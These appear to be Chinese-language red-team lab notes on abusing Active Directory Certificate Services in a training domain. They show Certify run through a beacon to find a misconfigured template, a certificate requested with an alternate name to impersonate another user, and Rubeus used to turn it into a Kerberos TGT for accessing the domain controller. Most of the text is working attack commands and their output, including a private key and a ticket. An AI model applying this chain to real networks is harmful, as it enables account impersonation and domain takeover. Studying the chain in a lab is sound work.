# Finding Certificate Authorities

枚举域证书信息 


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660484464732.png)

```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
[*] Tasked beacon to run .NET program: Certify.exe cas
[+] host called home, sent: 279617 bytes
[+] received output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=cyberbotic,DC=io'


[*] Root CAs

    Cert SubjectName              : CN=ca-1, DC=cyberbotic, DC=io
    Cert Thumbprint               : 7F8A1EFB7A50E2D1DE098085301926AA13AE0A71
    Cert Serial                   : 31AC83C6678F28994CFB58207C9FB668
    Cert Start Date               : 2/25/2022 11:29:14 AM
    Cert End Date                 : 2/25/2047 11:39:08 AM
    Cert Chain                    : CN=ca-1,DC=cyberbotic,DC=io



[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : ca-1
    DNS Hostname                  : dc-1.cyberbotic.io
    FullName                      : dc-1.cyberbotic.io\ca-1
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=ca-1, DC=cyberbotic, DC=io
    Cert Thumbprint               : 7F8A1EFB7A50E2D1DE098085301926AA13AE0A71
    Cert Serial                   : 31AC83C6678F28994CFB58207C9FB668
    Cert Start Date               : 2/25/2022 11:29:14 AM
    Cert End Date                 : 2/25/2047 11:39:08 AM
    Cert Chain                    : CN=ca-1,DC=cyberbotic,DC=io
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               CYBER\Domain Admins           S-1-5-21-378720957-2217973887-3501892633-512
      Allow  ManageCA, ManageCertificates               CYBER\Enterprise Admins       S-1-5-21-378720957-2217973887-3501892633-519
    Enrollment Agent Restrictions : None

....


    Enterprise CA Name            : ca-2
    DNS Hostname                  : dc-2.dev.cyberbotic.io
    FullName                      : dc-2.dev.cyberbotic.io\ca-2
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=ca-2, DC=dev, DC=cyberbotic, DC=io
    Cert Thumbprint               : 2D0349C77D35808E35A7C6815CF37B51D9A5D431
    Cert Serial                   : 64000000067ED180604220703C000000000006
    Cert Start Date               : 3/1/2022 10:45:07 AM
    Cert End Date                 : 3/1/2024 10:55:07 AM
    Cert Chain                    : CN=ca-1,DC=cyberbotic,DC=io -> CN=ca-2,DC=dev,DC=cyberbotic,DC=io
    UserSpecifiedSAN              : Could not connect to the HKLM hive - The network path was not found.

    CA Permissions                :



Certify completed in 00:00:07.9411960

```


# Misconfigured Certificate Templates

使用[Certify](https://github.com/GhostPack/Certify)工具查找任何易受攻击的模板

```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660484646273.png)

```
[+] received output:

[!] Vulnerable Certificates Templates :

    CA Name                               : dc-1.cyberbotic.io\ca-1
    Template Name                         : VulnerableUserTemplate
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CYBER\Domain Admins           S-1-5-21-378720957-2217973887-3501892633-512
                                      CYBER\Domain Users            S-1-5-21-378720957-2217973887-3501892633-513
                                      CYBER\Enterprise Admins       S-1-5-21-378720957-2217973887-3501892633-519
      Object Control Permissions
        Owner                       : CYBER\Administrator           S-1-5-21-378720957-2217973887-3501892633-500
        WriteOwner Principals       : CYBER\Administrator           S-1-5-21-378720957-2217973887-3501892633-500
                                      CYBER\Domain Admins           S-1-5-21-378720957-2217973887-3501892633-512
                                      CYBER\Enterprise Admins       S-1-5-21-378720957-2217973887-3501892633-519
        WriteDacl Principals        : CYBER\Administrator           S-1-5-21-378720957-2217973887-3501892633-500
                                      CYBER\Domain Admins           S-1-5-21-378720957-2217973887-3501892633-512
                                      CYBER\Enterprise Admins       S-1-5-21-378720957-2217973887-3501892633-519
        WriteProperty Principals    : CYBER\Administrator           S-1-5-21-378720957-2217973887-3501892633-500
                                      CYBER\Domain Admins           S-1-5-21-378720957-2217973887-3501892633-512
                                      CYBER\Enterprise Admins       S-1-5-21-378720957-2217973887-3501892633-519



Certify completed in 00:00:00.9969350

```


生成证书
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-1.cyberbotic.io\ca-1 /template:VulnerableUserTemplate /altname:nglover
```

```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-1.cyberbotic.io\ca-1 /template:VulnerableUserTemplate /altname:nglover
[*] Tasked beacon to run .NET program: Certify.exe request /ca:dc-1.cyberbotic.io\ca-1 /template:VulnerableUserTemplate /altname:nglover
[+] host called home, sent: 279765 bytes
[+] received output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Request a Certificates

[*] Current user context    : CYBER\iyates
[*] No subject name specified, using current context as subject.

[*] Template                : VulnerableUserTemplate
[*] Subject                 : CN=Isabel Yates, CN=Users, DC=cyberbotic, DC=io
[*] AltName                 : nglover

[+] received output:

[*] Certificate Authority   : dc-1.cyberbotic.io\ca-1

[+] received output:

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 8

[+] received output:

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAxhcCxbwqy9c8HKgEW1QFIivFTJxU4ML93+lcU+xluV0cwnkw
8oa8MuNlyEZmGGcJLJB4LVmx9f2C084nlKf6dZ3ybLVx+sxlsNsyso2QZKsVZg8d
ysqDgyr9aTtjwkePoqIXSzznsC79cVYKAnvINYKQNQoicU0PZPW11SNcQmdRzWeY
CNLRkVCOT2dnwHt7HszAhwFuAZ1pgA+IETIPR2UZTCToF9sUCTURDZh+p1BT4onb
OFiasyzw5Xvxt5KetTk2n8sfQ7Fk3fDQLuC8q9Pfeu4Jyunm6VH0OhAq+sRBgpSy
IFR5NSpl0AoA7cP0em6z4u2dz3EqPIKTYn2KowIDAQABAoIBABVUiv7h2TXj8lwf
l4CCFp9sWS17tAQT2ySOS1vaG8YPCbbDOAsViRRtuhsLwZilF67Ny7MOcoRLjRfj
ng163RRnMqCUFTbtZZHauKXTapX8eixoOkwI7IpmSa1YMNDNxeC8VYfLgiNNnArl
OeS0kYV5jq+3bKgIpTy43KCb0yZvKymtLcrxVjElP04g+ANe8FHvLfwTzH1AyueY
A1ITdeXFI3hvgYKn92nw4Pza7ZNl48WWfKyCK8OcCIjDp61ohswHG8Lpo1DppX8Z
hH1Iz4QpkBctjrnrkTjlBGhBu3xVT+CqdaSIE+5Z3fFGJhK8LlxIbc+f/pY9CpxN
ZIPF2vECgYEA1tgpyhlhnIXmg05Xb9HvuF7QmzvyxUq+cWD37vdlAtee19tWt3QE
MTHa65XbNfi5ScZHYh20RI/tgsVXKtnIkJ4NJ2zQ0PSpQq8y5n4L2ZWn4JJS9X8Z
Gg/JKiB2b1Q2Q5W8xwGTgXq/F94gFTsRQR+sFIoRXlWd7ct5rYEzQ9sCgYEA7Ak3
lY7VnUjQSe3vWeatADTGkaPxAD8dEW2YtSORMa8J3Y1IcTSZinCbl0Z6xji2Vuz7
iz4ERtZQSxcao8j+5tsjgYEQyerf/1SdD8mrd5C+545maPJ1BENFMj0Sy6VdaR8l
ZJKX4u0tObvug+FW/cawaJF+ig0L+jBkB67s8tkCgYA28w6tLBS1LeIpT045wV4o
r8d3DLwpDdbrtLt1GT1ynqd32hex0DCKTJALlUZ95WGuptH3HFXQ+2bp/YMv6IfN
xT7kCIbYCtuHvLuuDCsHuak4XPRu6dUHv2XaKndgPg+q9Y9U7uhFQ5nAhwV5qKPf
HjSrBC0xDYDZIyO55sOv5QKBgFTBdokosgH5fHmfi7v/fg295bO0Z7zL7PcuIJCi
xedOUD+TFPk5hwzUJLqsXzfAc5FBJY45ZbW+DTT5heJcMVPaSqSdINcwlOCNlJxv
sTeM7VAerR1wOp6ePUGt9orTxXgS7A1yKkIdIolBt4L5rpAQAZZ68DJIPw3GxJSR
tpn5AoGAcQm/0K3r6jIYwjyz8L7gS2tdNWpgDuU0kaqX0lmgn3iGUbAvObOo4D24
kNEcaF57d+C+hSMpDlB5/MZWCdax2rEoq8DqJTS2sOsHxWAFvkUZL6hMu6Z4Mug2
S5V9kgmIZjuGPciu9NM8KG8ZngOvW4x5rYE84y/PUsoyNdevecc=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGATCCBOmgAwIBAgITZAAAAAj35a/4E7TaTQAAAAAACDANBgkqhkiG9w0BAQsF
ADA/MRIwEAYKCZImiZPyLGQBGRYCaW8xGjAYBgoJkiaJk/IsZAEZFgpjeWJlcmJv
dGljMQ0wCwYDVQQDEwRjYS0xMB4XDTIyMDgxNDEzMzYzNFoXDTIzMDgxNDEzMzYz
NFowVzESMBAGCgmSJomT8ixkARkWAmlvMRowGAYKCZImiZPyLGQBGRYKY3liZXJi
b3RpYzEOMAwGA1UEAxMFVXNlcnMxFTATBgNVBAMTDElzYWJlbCBZYXRlczCCASIw
DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMYXAsW8KsvXPByoBFtUBSIrxUyc
VODC/d/pXFPsZbldHMJ5MPKGvDLjZchGZhhnCSyQeC1ZsfX9gtPOJ5Sn+nWd8my1
cfrMZbDbMrKNkGSrFWYPHcrKg4Mq/Wk7Y8JHj6KiF0s857Au/XFWCgJ7yDWCkDUK
InFND2T1tdUjXEJnUc1nmAjS0ZFQjk9nZ8B7ex7MwIcBbgGdaYAPiBEyD0dlGUwk
6BfbFAk1EQ2YfqdQU+KJ2zhYmrMs8OV78beSnrU5Np/LH0OxZN3w0C7gvKvT33ru
Ccrp5ulR9DoQKvrEQYKUsiBUeTUqZdAKAO3D9Hpus+Ltnc9xKjyCk2J9iqMCAwEA
AaOCAtwwggLYMDsGCSsGAQQBgjcVBwQuMCwGJCsGAQQBgjcVCIbIihb8ojyEoYc8
gvSPaMfvbFaFy4RIhvjECgIBZAIBAzApBgNVHSUEIjAgBggrBgEFBQcDAgYIKwYB
BQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcVCgQo
MCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkqhkiG
9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4D
AgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFIBbzEYJ9gva21tK5IaQJZoczIhOMCIG
A1UdEQQbMBmgFwYKKwYBBAGCNxQCA6AJDAduZ2xvdmVyMB8GA1UdIwQYMBaAFK95
L8P8RbqLPv3ppNZfgCqo92odMIHBBgNVHR8EgbkwgbYwgbOggbCgga2GgapsZGFw
Oi8vL0NOPWNhLTEsQ049ZGMtMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vy
dmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1jeWJlcmJvdGlj
LERDPWlvP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFz
cz1jUkxEaXN0cmlidXRpb25Qb2ludDCBuAYIKwYBBQUHAQEEgaswgagwgaUGCCsG
AQUFBzAChoGYbGRhcDovLy9DTj1jYS0xLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWN5YmVy
Ym90aWMsREM9aW8/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
ZmljYXRpb25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBAIALFOR5LVa2IKYo
HLhbNAlUtRJnBduhyBOjsqsmaV7+9BeAnskvV7ff/b55Qrju3AhjEFaYlOHuvS1i
CO3qLFzzUncuCFSF4GjChSrbteHhGSrZpftm2BdRWb7oVebLzYLGorSYjDEREBnM
Ng3ow6Ld04kPIXrT9VU2doVVGd6SA1r+aq1T8o/P5Uuv6jpPu63ktf0Q2IOZePY5
AHvKmMwGKRxQZXRLfWx8AC70jXL29QUOuvOjY9zSM6KAZXIFa7KR6xyKiZDKAXiI
fCDqDDzbuH8q+GwtgMrisk0OFMY0j1SG2Rx4qYlQK4g3nOcCznsLIkPAt7A8d6fS
UlykRQk=
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:15.2736817

```

复制上面证书内容到cert.pem，然后openssl输出成cert.pfx
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660484985024.png)


使用bases64输出证书
```
root@kali:~/Desktop# cat cert.pfx | base64 -w 0

MIIMtwIBAzCC......AgIIAA==

root@kali:~/Desktop#
```


使用上面证书生成tgt，**注意**，这里指定的**/password**参数是上面生成证书时输入的密码



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660485863234.png)

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:nglover /certificate:MIIMtwIBAzCC......AgIIAA== /password:123 /aes256 /nowrap

[*] Tasked beacon to run .NET program: Rubeus.exe asktgt /user:nglover /certificate:MIIMtwIBAzCC......AgIIAA== /password:123 /aes256 /nowrap
[+] host called home, sent: 594083 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: Ask TGT


[+] received output:
[*] Using PKINIT with etype rc4_hmac and subject: CN=Isabel Yates, CN=Users, DC=cyberbotic, DC=io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'cyberbotic.io\nglover'

[+] received output:
[*] Using domain controller: 10.10.15.75:88

[+] received output:
[+] TGT request successful!

[+] received output:
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/cyberbotic.io
  ServiceRealm             :  CYBERBOTIC.IO
  UserName                 :  nglover
  UserRealm                :  CYBERBOTIC.IO
  StartTime                :  8/14/2022 2:00:00 PM
  EndTime                  :  8/15/2022 12:00:00 AM
  RenewTill                :  8/21/2022 2:00:00 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  wyDald3/L7j0qZ/Bd7vVqA==
  ASREP (key)              :  92E1616B29013121E4004AB70FF7D03F



```


拿到tgt,制作票据
```
[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\nglover.kirbi", [Convert]::FromBase64String("doIGDjC...WJlcmJvdGljLmlv"))
```


导入ticket，访问dc-1


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660486344943.png)

# NTLM Relaying to ADCS HTTP Endpoints

